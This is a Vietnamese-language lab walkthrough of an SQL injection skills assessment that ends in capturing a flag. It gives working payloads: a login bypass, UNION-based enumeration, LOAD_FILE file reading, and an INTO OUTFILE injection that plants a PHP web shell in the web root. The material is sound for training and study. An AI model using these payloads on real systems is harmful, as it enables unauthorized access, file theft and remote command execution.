<h1>Skills Assessment - SQL Injection Fundamentals</h1>

![image](https://github.com/user-attachments/assets/d9b69a4c-0cbe-4f95-ba76-2e933b8c5ada)

![image](https://github.com/user-attachments/assets/db031969-8215-464d-920a-b9a42be8eb32)

![image](https://github.com/user-attachments/assets/e0999f0d-842a-430d-86f2-0e0f2dcb8bcf)

Sau khi ngồi thử 1 số payloads thì cuối cùng cũng vào được bằng cái `admin' OR 1 = 1 -- a`:

![image](https://github.com/user-attachments/assets/b4abe8c7-2b92-4967-8b29-2e232836a0da)

Và đây là giao diện của nó sau khi tôi đăng nhập bằng SQLi:

![image](https://github.com/user-attachments/assets/5b7b3839-67d0-4be0-a3f5-f3f51ea1ce75)

Bằng cách spam `' ORDER BY 1 -- a` thì tôi biết được nó có 5 cột:

![image](https://github.com/user-attachments/assets/cb8c58e2-1580-4a0a-aebc-d8dbee1d3029)

Để chắc hơn thì tôi dùng `' UNION SELECT 1, user(), 3, 4, 5-- -` để xem:

![image](https://github.com/user-attachments/assets/51afb444-13f0-4c08-9ed4-2303c40eaf11)

Dùng `abc' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'-- -` thì nó bị từ chối, không đủ quyền:

![image](https://github.com/user-attachments/assets/6c0526db-006f-4b97-b8da-29d306562265)

Tôi thử dùng `' UNION SELECT 1, LOAD_FILE("/var/www/html/dashboard/dashboard.php"), 3, 4, 5-- -` để test chức năng đọc file và nó đọc được:

![image](https://github.com/user-attachments/assets/1689ebaf-3d3d-4a00-bdc2-000c49229987)

Nhưng mà đọc trong /root thì cần pass của root nữa, tôi thử lại cái lệnh write 1 file vào nhưng là trong dashboard thì được `abc' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -` :

![image](https://github.com/user-attachments/assets/d242c9b8-9d2e-4d97-96c4-64f1adaa8d34)

![image](https://github.com/user-attachments/assets/61811283-3d9a-4432-b8a4-f6496751cefe)

Flag đây rồi:

![image](https://github.com/user-attachments/assets/f08b3c0c-5cbe-4b8f-830c-86c29137ed81)

![image](https://github.com/user-attachments/assets/029ce8af-f6cb-4c8a-85c4-69d5c3049ce7)
